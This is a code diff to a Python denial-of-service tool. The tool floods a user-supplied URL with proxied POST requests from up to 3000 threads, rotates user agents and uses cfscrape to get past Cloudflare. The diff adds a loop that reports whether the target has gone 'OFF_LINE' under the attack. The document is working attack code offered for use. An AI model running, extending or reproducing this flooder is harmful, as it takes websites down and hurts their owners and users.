@@ -1,10 +1,12 @@
 import colorama
+from colorama import Style
 import threading
 import random
 import requests
 import cfscrape
 import os
 import pyAesCrypt
+import time
 
 os.system("clear")
 
@@ -110,7 +112,7 @@ def dos1(target):
             s.post(target, headers=header2, proxies=proxiessockshttps)
         except:
             pass
-
+        
 
 def dos2(target):
     while True:
@@ -131,7 +133,7 @@ print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-
 print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
 print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
 print("Creator: VaRaMBaZ")
-print("Version: 1.6.3; Speeding up thread launches and reducing workload \n")
+print("Version: 1.6.5; Add check site status \n")
 
 url = input("URL: ")
 if not url.__contains__("http"):
@@ -141,11 +143,11 @@ if not url.__contains__("."):
     exit(colorama.Fore.RED + "Invalid domain")
 
 try:
-    threads = int(input("Threads[max 10000]: "))
+    threads = int(input("Threads[max 3000]: "))
 except ValueError:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-if threads == 0 or threads > 10000:
+if threads == 0 or threads > 3000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
 bar = threading.Barrier(threads)
@@ -162,3 +164,23 @@ else:
         thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
+print(Style.RESET_ALL)
+
+while True:
+    useragent = random.choice(headersp)
+    header = {'user-agent': useragent}
+    
+    proxyagenthttp = random.choice(proxy_http)
+    proxieshttphttp = {
+        'http': f'http://{proxyagenthttp}',
+        'https': f'http://{proxyagenthttp}',
+    }
+    try:
+        checksite = requests.post(url, headers=header, proxies=proxieshttphttp)
+        if checksite.status_code >= 500:
+            statustext = "OFF_LINE"
+        else:
+            statustext = "ON_LINE" 
+    except:
+        pass
+    print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
